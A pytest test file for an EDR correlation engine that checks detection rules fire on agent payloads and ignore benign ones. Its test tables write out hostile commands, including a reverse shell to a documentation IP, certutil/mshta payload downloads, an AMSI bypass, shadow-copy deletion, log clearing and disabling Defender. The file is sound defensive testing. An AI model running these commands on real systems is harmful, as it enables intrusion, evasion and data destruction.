"""Endpoint rules must fire on what the agents REALLY send, and only on that.

Every case starts as the JSON an agent POSTs (tests/unit/edr_payloads.py), goes
through the REAL ingest route (which publishes the `edr.event_batch` the engine
consumes), then the REAL CorrelationEngine, and asserts the specific rule fired
and that the incident is about the right entity. Only the DB session, the bus
transport and incident persistence are faked.

Before this, a batch reached the engine and was then mostly discarded: the kind
map knew five kinds, file/registry/network fields were never read, the Python
agent's payloads had no `kind` at all, and ~20 process rules searched command
tokens inside the executable path.
"""
from __future__ import annotations

import asyncio
import ipaddress

import pytest

from . import edr_payloads as P

T0 = 1_800_000_000.0


class _Clock:
    def __init__(self):
        self.t = T0

    def __call__(self):
        return self.t


@pytest.fixture
def engine(monkeypatch):
    from app.services import correlation_engine as ce

    monkeypatch.setattr(ce, "_now_ts", _Clock())
    eng = ce.CorrelationEngine()
    if getattr(eng, "_watcher", None) is not None:
        try:
            eng._watcher.stop()
        except Exception:
            pass
        eng._watcher = None
    eng._event_bus = P.Bus()
    eng.incidents = []

    async def _create_incident(rule, alert):
        eng.incidents.append((rule.get("id"), alert))

    async def _fast_triage(event, matches):
        return None

    eng._create_incident = _create_incident
    eng._run_fast_triage = _fast_triage
    return eng


@pytest.fixture
def doc_ranges_are_external(monkeypatch):
    """`ipaddress` files RFC 5737 documentation ranges under is_private, so the
    engine's real gate treats 198.51.100.x as internal. Tests need a public-looking
    peer that is safe to publish, so narrow the gate to RFC1918 / loopback /
    CGNAT for the tests that need one. Tests about internal peers do not use this."""
    from app.services import correlation_engine as ce

    internal = [ipaddress.ip_network(n) for n in (
        "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8",
        "169.254.0.0/16", "100.64.0.0/10")]

    def gate(ip):
        try:
            addr = ipaddress.ip_address(ip)
        except ValueError:
            return True
        return any(addr in n for n in internal)

    monkeypatch.setattr(ce, "_is_internal_ip", gate)


def feed(engine, batch: dict):
    async def go():
        await engine._on_edr_batch(batch)
        for _ in range(4):
            await asyncio.sleep(0)
        if engine._edr_batch_tasks:
            await asyncio.gather(*list(engine._edr_batch_tasks))
        for _ in range(4):
            await asyncio.sleep(0)
    asyncio.run(go())


def fired(engine) -> dict[str, dict]:
    return {rid: alert for rid, alert in engine.incidents}


def tauri(monkeypatch, engine, *events):
    feed(engine, P.through_tauri_route(monkeypatch, list(events)))
    return fired(engine)


def python_agent(monkeypatch, engine, *events):
    feed(engine, P.through_python_route(monkeypatch, list(events)))
    return fired(engine)


def assert_host_incident(alert: dict):
    assert alert["host"] == P.HOST
    assert alert["source_ip"] is None
    assert alert["source"] == "correlation_engine"


# ---------------------------------------------------------------------------
# one real payload per re-enabled rule family
# ---------------------------------------------------------------------------

def test_tauri_vssadmin_process_start(monkeypatch, engine):
    alerts = tauri(monkeypatch, engine, P.VSSADMIN)
    assert_host_incident(alerts["ransomware_vss_delete"])


def test_tauri_encoded_powershell_reads_the_command_line(monkeypatch, engine):
    alerts = tauri(monkeypatch, engine, P.PS_ENC)
    assert_host_incident(alerts["sigma_c2_encoded_powershell"])
    ev = alerts["sigma_c2_encoded_powershell"]["triggering_event"]
    # `path` stays the executable; the tokens were found in the command line
    assert ev["path"].endswith("powershell.exe")
    assert "-enc" in ev["cmdline"]


def test_tauri_file_create_startup_folder(monkeypatch, engine):
    alerts = tauri(monkeypatch, engine, P.FILE_STARTUP)
    assert_host_incident(alerts["sigma_persist_startup_folder"])
    assert alerts["sigma_persist_startup_folder"]["triggering_event"]["path"].endswith("updater.exe")


def test_tauri_registry_set_run_key(monkeypatch, engine):
    alerts = tauri(monkeypatch, engine, P.REG_RUN)
    assert_host_incident(alerts["sigma_persist_registry_run"])


def test_tauri_image_load_from_temp(monkeypatch, engine):
    alerts = tauri(monkeypatch, engine, P.DLL_TEMP)
    assert_host_incident(alerts["sigma_privesc_dll_hijack"])


def test_python_agent_process_ssh_tunnel(monkeypatch, engine):
    alerts = python_agent(monkeypatch, engine, P.PY_PROC_SSH_TUNNEL)
    assert_host_incident(alerts["sigma_lateral_ssh_tunnel"])
    assert alerts["sigma_lateral_ssh_tunnel"]["triggering_event"]["process_name"] == "ssh"


def test_python_agent_fim_created_cron(monkeypatch, engine):
    alerts = python_agent(monkeypatch, engine, P.PY_FIM_CRON)
    assert_host_incident(alerts["sigma_persist_cron"])
    assert alerts["sigma_persist_cron"]["triggering_event"]["event_type"] == "file_creation" or \
        alerts["sigma_persist_cron"]["triggering_event"]["event_type"] == "file_modification"


def test_forensic_canary_signal_is_unpacked(monkeypatch, engine):
    alerts = python_agent(monkeypatch, engine, P.FORENSIC_CANARY)
    assert_host_incident(alerts["ransomware_canary_modified"])
    ev = alerts["ransomware_canary_modified"]["triggering_event"]
    assert ev["path"].endswith(".aegis-canary.docx")
    assert ev["process_name"] == "locker.exe"


def test_forensic_without_a_canary_signal_fires_nothing(monkeypatch, engine):
    assert python_agent(monkeypatch, engine, P.FORENSIC_NO_CANARY) == {}


def test_windows_4624_rdp_from_an_external_address(monkeypatch, engine, doc_ranges_are_external):
    alerts = python_agent(monkeypatch, engine, P.PY_RDP_EXTERNAL)
    alert = alerts["ransomware_rdp_then_encrypt"]
    assert_host_incident(alert)
    ev = alert["triggering_event"]
    assert ev["rdp_source_ip"] == P.C2_PEER and ev["username"] == "jdoe"
    # A successful login is not proof of an attacker: nothing to block.
    from app.services.ai_engine import resolve_action_target
    assert resolve_action_target("block_ip", alert)[0] is None
    assert resolve_action_target("firewall_rule", alert)[0] is None


def test_windows_4624_rdp_from_a_lan_address_or_console_logon(monkeypatch, engine, doc_ranges_are_external):
    assert python_agent(monkeypatch, engine, P.PY_RDP_INTERNAL, P.PY_CONSOLE_LOGON) == {}


def test_nodes_registry_persistence_bridges_and_replaces_the_direct_incident(monkeypatch, engine):
    batch, db = P.through_nodes_route(monkeypatch, P.NODE_REGISTRY)
    feed(engine, batch)
    assert_host_incident(fired(engine)["sigma_persist_registry_run"])
    ev = fired(engine)["sigma_persist_registry_run"]["triggering_event"]
    assert ev["path"] == "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
    # the rule opens the incident; the legacy direct Incident row (which carried
    # the agent's own LAN address as source_ip) is no longer written for it
    assert db.rows == []


def test_nodes_psexec_service_install(monkeypatch, engine):
    batch, _db = P.through_nodes_route(monkeypatch, P.NODE_PSEXEC)
    feed(engine, batch)
    assert_host_incident(fired(engine)["sigma_lateral_psexec"])


def test_nodes_resent_event_is_evaluated_once_and_benign_service_fires_nothing(monkeypatch, engine):
    from app.api import nodes as nodes_api

    bus = P.Bus()
    from app.services import edr_transport
    monkeypatch.setattr(edr_transport, "event_bus", bus)
    nodes_api._node_event_seen.clear()
    db = P.FakeDB(P.agent_row())

    async def post(payload):
        await nodes_api.receive_node_event(nodes_api.NodeEventRequest(**payload), db=db)

    async def go():
        for _ in range(5):          # the agent re-sends the same record every ~15s
            await post(P.NODE_PSEXEC)
        await post(P.NODE_SERVICE_BENIGN)
    asyncio.run(go())
    assert len(bus.batches()) == 2, "the repeated 4697 must reach the engine once"
    for batch in bus.batches():
        feed(engine, batch)
    assert set(fired(engine)) == {"sigma_lateral_psexec"}


def test_nodes_events_not_owned_by_a_rule_keep_their_direct_incident(monkeypatch):
    payload = {"node_id": P.AGENT_ID, "event_type": "lotl_process_creation", "severity": "high",
               "details": {"event_id": 4688, "command_line": "mshta.exe http://x.example.test/a.hta"},
               "timestamp": "2026-09-29T10:00:00+00:00"}
    batch, db = P.through_nodes_route(monkeypatch, payload)
    assert batch["events"] == [], "lotl events are not bridged (process_start already covers them)"
    assert len(db.rows) == 1 and db.rows[0].title == "EDR: lotl_process_creation"


# ---------------------------------------------------------------------------
# process rules: every retargeted rule fires on its command line, not on benign ones
# ---------------------------------------------------------------------------

def _proc(name, cmd, path=None):
    return P.tauri_event("process_start", name=name, path=path or f"C:\\bin\\{name}", cmd=cmd)


PROCESS_CASES = [
    ("ransomware_bcdedit_recovery_disable", "bcdedit.exe", "bcdedit /set {default} recoveryenabled no", "bcdedit /enum"),
    ("ransomware_shadow_copy_delete", "tmutil", "tmutil delete /Volumes/Backups/2026-09-28", "tmutil listbackups"),
    ("ransomware_vss_delete", "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", "vssadmin.exe list shadows"),
    ("ransomware_wbadmin_delete", "wbadmin.exe", "wbadmin delete catalog -quiet", "wbadmin get versions"),
    ("ransomware_lolbin_certutil", "certutil.exe", "certutil.exe -urlcache -f http://x.example.test/a.exe a.exe", "certutil.exe -hashfile a.bin SHA256"),
    ("ransomware_lolbin_rundll32", "rundll32.exe", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"", "rundll32.exe shell32.dll,Control_RunDLL"),
    ("sigma_c2_lolbin", "mshta.exe", "mshta.exe http://x.example.test/a.hta", "mshta.exe C:\\ops\\local.hta"),
    ("sigma_c2_reverse_shell", "bash", "bash -i >& /dev/tcp/192.0.2.9/4444 0>&1", "bash -c 'echo hi'"),
    ("sigma_cloud_container_escape", "nsenter", "nsenter --target 1 --mount --uts --ipc --net --pid -- bash", "nsenter --target 4242 --net ip addr"),
    ("sigma_cloud_cryptomining", "xmrig", "/tmp/xmrig -o stratum+tcp://pool.example.test:3333 -u wallet", "/usr/bin/python3 app.py"),
    ("sigma_evasion_amsi_bypass", "powershell.exe", "powershell.exe [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)", "powershell.exe Get-Process"),
    ("sigma_evasion_av_tamper", "sc.exe", "sc stop WinDefend", "sc query WinDefend"),
    ("sigma_evasion_firewall_mod", "netsh.exe", "netsh advfirewall set allprofiles state off", "netsh interface show interface"),
    ("sigma_evasion_indicator_removal", "shred", "shred -u /var/log/auth.log", "ls /var/log"),
    ("sigma_evasion_log_deletion", "wevtutil.exe", "wevtutil cl Security", "wevtutil qe Security /c:5"),
    ("sigma_evasion_timestomping", "touch", "touch -d 2020-01-01 /tmp/implant", "touch /tmp/marker"),
    ("sigma_exfil_steganography", "steghide", "steghide embed -cf a.jpg -ef secret.txt", "ls snowdrift"),
    ("sigma_lateral_ssh_tunnel", "ssh", "ssh -N -L 8080:10.0.0.5:80 jump.example.test", "ssh -l jdoe jump.example.test"),
    ("sigma_privesc_capabilities", "setcap", "setcap cap_setuid+ep /tmp/helper", "getcap -r /usr/bin"),
    ("sigma_privesc_kernel_exploit", "dirtycow", "/tmp/dirtycow-exploit --target /etc/passwd", "/usr/bin/tmux new -s work"),
    ("sigma_privesc_setuid_change", "chmod", "chmod 4755 /tmp/helper", "chmod 644 /tmp/notes.txt"),
    ("sigma_persist_login_hook", "defaults", "defaults write com.apple.loginwindow LoginHook /tmp/x.sh", "defaults write com.apple.dock autohide -bool true"),
    ("sigma_persist_scheduled_task", "schtasks.exe", "schtasks /create /tn Updater /tr C:\\x.exe /sc onlogon", "schtasks /query"),
]


@pytest.mark.parametrize("rule_id,name,bad,good", PROCESS_CASES, ids=[c[0] for c in PROCESS_CASES])
def test_process_rule_fires_on_its_command_line_and_not_on_the_benign_one(
        monkeypatch, engine, rule_id, name, bad, good):
    alerts = tauri(monkeypatch, engine, _proc(name, good))
    assert rule_id not in alerts, f"{rule_id} fired on benign `{good}`"
    engine.incidents.clear()
    alerts = tauri(monkeypatch, engine, _proc(name, bad))
    assert rule_id in alerts, f"{rule_id} did not fire on `{bad}`; fired {sorted(alerts)}"
    assert_host_incident(alerts[rule_id])


def test_setuid_symbolic_form_also_fires(monkeypatch, engine):
    assert "sigma_privesc_setuid_change" in tauri(monkeypatch, engine, _proc("chmod", "chmod u+s /bin/bash"))


def test_archive_creation_needs_two_on_the_same_host(monkeypatch, engine):
    one = _proc("tar", "tar czf /tmp/a.tgz /home/jdoe/docs")
    two = _proc("zip", "zip -r /tmp/b.zip /home/jdoe/docs")
    assert "sigma_exfil_archive_creation" not in tauri(monkeypatch, engine, one, _proc("tar", "tar xzf /tmp/a.tgz"))
    assert "sigma_exfil_archive_creation" in tauri(monkeypatch, engine, two)
    assert_host_incident(fired(engine)["sigma_exfil_archive_creation"])


def test_sudo_abuse_needs_three_on_the_same_host(monkeypatch, engine):
    sudo = _proc("sudo", "sudo -u root bash")
    assert "sigma_privesc_sudo_abuse" not in tauri(monkeypatch, engine, sudo, sudo)
    assert "sigma_privesc_sudo_abuse" in tauri(monkeypatch, engine, sudo)
    engine.incidents.clear()
    assert "sigma_privesc_sudo_abuse" not in tauri(monkeypatch, engine, _proc("sudo", "sudo ls /root"))


def test_python_agent_ls_with_ssh_flag_letters_fires_nothing(monkeypatch, engine):
    """`-l -R -D` are ssh tunnel flags only after `ssh`; the old token match
    fired on any command line containing them."""
    assert python_agent(monkeypatch, engine, P.PY_PROC_LS, P.PY_PROC_SSH_PLAIN) == {}


def test_two_hosts_do_not_share_a_rule_cooldown(engine):
    async def go():
        for host in ("ws-a.example.test", "ws-b.example.test"):
            await engine._on_edr_event({
                "kind": "process_start", "hostname": host, "agent_id": host,
                "process_name": "powershell.exe", "command_line": P.PS_ENC["command_line"]})
    asyncio.run(go())
    hosts = {a["host"] for rid, a in engine.incidents if rid == "sigma_c2_encoded_powershell"}
    assert hosts == {"ws-a.example.test", "ws-b.example.test"}


# ---------------------------------------------------------------------------
# negatives
# ---------------------------------------------------------------------------

def test_benign_endpoint_traffic_fires_nothing(monkeypatch, engine, doc_ranges_are_external):
    assert tauri(monkeypatch, engine, P.CHROME, P.PS_BENIGN, P.FILE_BENIGN, P.REG_BENIGN,
                 P.REG_DELETE, P.DLL_BENIGN, P.TCP_HTTPS) == {}
    assert python_agent(monkeypatch, engine, P.PY_FIM_BENIGN, P.PY_NET_LISTEN) == {}


def test_process_stop_is_not_a_process_start(monkeypatch, engine):
    from app.services.edr_events import translate_edr_event

    stop = dict(P.VSSADMIN_EXIT, command_line="vssadmin.exe delete shadows /all /quiet")
    events = translate_edr_event({**stop, "hostname": P.HOST}, default_host="h")
    assert [e["event_type"] for e in events] == ["process_termination"]
    assert events[0]["cmdline"] == ""
    assert tauri(monkeypatch, engine, stop) == {}
    # and the legacy host_monitor exit payload
    asyncio.run(engine._on_edr_event({"type": "process_stop", "pid": 4242, "agent_id": "aegis-mac"}))
    assert engine.incidents == []


def test_file_deletion_is_not_persistence(monkeypatch, engine):
    assert python_agent(monkeypatch, engine, P.PY_FIM_CRON_DELETED) == {}


def test_registry_key_with_run_in_its_name_is_not_a_run_key(monkeypatch, engine):
    assert tauri(monkeypatch, engine, P.REG_BENIGN) == {}   # ...\Explorer\RunMRU


def test_unmapped_kinds_and_categories_are_dropped(engine):
    from app.services.edr_events import translate_edr_event

    for data in ({"kind": "dns_query", "target": "example.test"},
                 {"kind": "discovery", "details": {"services": []}},
                 {"kind": "breadcrumb", "details": {"file_path": "/tmp/x"}},
                 {"kind": "file_write"},            # no path: nothing to match
                 {"kind": "tcp_connect", "target": "not-an-ip:99"},
                 "nonsense"):
        assert translate_edr_event(data, default_host="h") == []


# ---------------------------------------------------------------------------
# endpoint network detections: what could the responder block?
# ---------------------------------------------------------------------------

def _targets(alert: dict) -> dict:
    from app.services.ai_engine import resolve_action_target
    return {a: resolve_action_target(a, alert)[0] for a in ("block_ip", "firewall_rule", "isolate_host")}


def test_outbound_irc_connection_names_the_remote_peer(monkeypatch, engine, doc_ranges_are_external):
    alerts = tauri(monkeypatch, engine, P.TCP_IRC)
    alert = alerts["sigma_c2_irc"]
    assert alert["source_ip"] == P.C2_PEER
    assert alert["host"] == P.HOST
    targets = _targets(alert)
    assert targets["block_ip"] == P.C2_PEER == targets["firewall_rule"]
    # the compromised endpoint is only ever a human-gated isolate target, by name
    assert targets["isolate_host"] == P.HOST
    ev = alert["triggering_event"]
    assert ev["destination_port"] == 6667 and ev["direction"] == "outbound"
    assert P.LOCAL_ADDR not in {ev["source_ip"], ev["destination_ip"], ev["remote_ip"]}


def test_python_agent_tor_connection_never_targets_the_local_address(monkeypatch, engine, doc_ranges_are_external):
    alerts = python_agent(monkeypatch, engine, P.PY_NET_TOR)
    alert = alerts["sigma_c2_tor"]
    assert alert["source_ip"] == P.C2_PEER and alert["host"] == P.HOST
    assert _targets(alert)["block_ip"] == P.C2_PEER
    assert P.LOCAL_ADDR not in str(_targets(alert).values())
    assert alert["triggering_event"]["local_addr"] == f"{P.LOCAL_ADDR}:51000"


def test_lan_peer_opens_nothing(monkeypatch, engine):
    assert tauri(monkeypatch, engine, P.TCP_LAN_IRC) == {}


def test_inbound_accept_is_not_translated(monkeypatch, engine, doc_ranges_are_external):
    """The ETW `daddr` of an accept is not reliably the remote side; naming it
    would put the customer's own address in source_ip."""
    assert tauri(monkeypatch, engine, P.TCP_ACCEPT) == {}


def test_safelisted_peer_is_never_a_detection(monkeypatch, engine, doc_ranges_are_external):
    from app.core import attack_detector

    monkeypatch.setattr(attack_detector, "_is_safe_ip", lambda ip: ip == P.C2_PEER)
    assert tauri(monkeypatch, engine, P.TCP_IRC) == {}


def test_endpoint_connection_to_a_known_ioc_fires_the_ioc_rule(monkeypatch, engine):
    """142.11.206.73 is the axios/SFrclak C2 in sigma_supply_axios_sfrclak_c2.
    Real public address, so the engine's own gates are used unpatched."""
    ioc = P.tauri_event("tcp_connect", pid=77, ppid=None, target="142.11.206.73:8000",
                        extra={"source": "etw_kernel_network"})
    alerts = tauri(monkeypatch, engine, ioc)
    alert = alerts["sigma_supply_axios_sfrclak_c2"]
    assert alert["source_ip"] == "142.11.206.73" and alert["host"] == P.HOST
    assert _targets(alert)["block_ip"] == "142.11.206.73"


def test_no_endpoint_event_ever_targets_a_private_or_local_address(monkeypatch, engine, doc_ranges_are_external):
    from app.services.ai_engine import RESPONSE_ACTIONS

    tauri(monkeypatch, engine, P.VSSADMIN, P.PS_ENC, P.FILE_STARTUP, P.REG_RUN, P.DLL_TEMP,
          P.TCP_IRC, P.TCP_LAN_IRC)
    python_agent(monkeypatch, engine, P.PY_PROC_SSH_TUNNEL, P.PY_FIM_CRON, P.PY_NET_TOR,
                 P.PY_RDP_EXTERNAL, P.FORENSIC_CANARY)
    assert engine.incidents
    allowed_blockable = {P.C2_PEER}
    for _rid, alert in engine.incidents:
        for actions in RESPONSE_ACTIONS.values():
            for action in actions:
                from app.services.ai_engine import resolve_action_target
                target, _ = resolve_action_target(action, alert)
                if target is None:
                    continue
                try:
                    ipaddress.ip_address(target)
                except ValueError:
                    continue        # a hostname / "unknown" context is not an address
                assert target in allowed_blockable, (_rid, action, target)


# ---------------------------------------------------------------------------
# remaining file / IOC families named by the rule inventory
# ---------------------------------------------------------------------------

FILE_CASES = [
    ("sigma_persist_cron", "/etc/cron.d/backdoor"),
    ("sigma_persist_systemd", "/etc/systemd/system/implant.service"),
    ("sigma_persist_init_script", "/etc/init.d/implant"),
    ("sigma_persist_ssh_keys", "/home/jdoe/.ssh/authorized_keys"),
]


@pytest.mark.parametrize("rule_id,path", FILE_CASES, ids=[c[0] for c in FILE_CASES])
def test_persistence_file_rules_fire_on_create_and_modify_from_both_agents(
        monkeypatch, engine, rule_id, path):
    for wire in (
        lambda: tauri(monkeypatch, engine, P.tauri_event("file_create", ppid=None, target=path)),
        lambda: tauri(monkeypatch, engine, P.tauri_event("file_write", ppid=None, target=path)),
        lambda: python_agent(monkeypatch, engine, P.py_event(
            "fim", "high", f"File modified: {path}",
            {"file_path": path, "event_type": "modified", "hash_before": "1", "hash_after": "2"})),
    ):
        engine.incidents.clear()
        engine._fired.clear()
        alerts = wire()
        assert rule_id in alerts, f"{rule_id} missed {path}"
        assert_host_incident(alerts[rule_id])
    engine.incidents.clear()
    engine._fired.clear()
    assert rule_id not in tauri(monkeypatch, engine, P.tauri_event(
        "file_delete", ppid=None, target=path)), "a deletion is not persistence"


IOC_CASES = [
    ("sigma_network_ayysshush_asus_c2", "101.99.91.151"),
    ("sigma_network_checkpoint_qilin_c2", "45.77.149.152"),
    ("sigma_network_fortibleed_ioc", "85.11.187.8"),
    ("sigma_supply_axios_sfrclak_c2", "142.11.206.73"),
    ("sigma_supply_mastra_easyday_c2", "23.254.164.92"),
    ("sigma_supply_nodeipc_azure_c2", "37.16.75.69"),
]


@pytest.mark.parametrize("rule_id,ip", IOC_CASES, ids=[c[0] for c in IOC_CASES])
def test_endpoint_connections_feed_the_ioc_rules(monkeypatch, engine, rule_id, ip):
    """Both agents; the engine's own (unpatched) gates, with the IOC as the peer."""
    alerts = tauri(monkeypatch, engine, P.tauri_event(
        "tcp_connect", pid=77, ppid=None, target=f"{ip}:443", extra={}))
    assert rule_id in alerts, f"{rule_id} missed a tcp_connect to {ip}"
    assert alerts[rule_id]["source_ip"] == ip and alerts[rule_id]["host"] == P.HOST
    engine.incidents.clear()
    engine._fired.clear()
    alerts = python_agent(monkeypatch, engine, P.py_event(
        "network", "info", f"New outbound connection: curl -> {ip}:443",
        {"local_addr": f"{P.LOCAL_ADDR}:5100", "remote_addr": f"{ip}:443", "pid": 9,
         "process_name": "curl", "status": "ESTABLISHED"}))
    assert rule_id in alerts and alerts[rule_id]["source_ip"] == ip


def test_ransomware_chain_now_completes_from_agent_payloads(monkeypatch, engine):
    """Encoded PowerShell, then shadow-copy deletion, same host: both legs were
    dead on real payloads before, so this chain could not complete."""
    completed = []
    original = engine._on_chain_triggered

    async def spy(chain_rule, event):
        completed.append((chain_rule["id"], event.get("hostname")))
        await original(chain_rule, event)

    engine._on_chain_triggered = spy
    from app.services import correlation_engine as ce

    feed(engine, P.through_tauri_route(monkeypatch, [P.PS_ENC]))
    ce._now_ts.t += 30           # the chain is ordered: the second leg comes later
    feed(engine, P.through_tauri_route(monkeypatch, [P.VSSADMIN]))
    assert ("ransomware_chain", P.HOST) in completed, completed
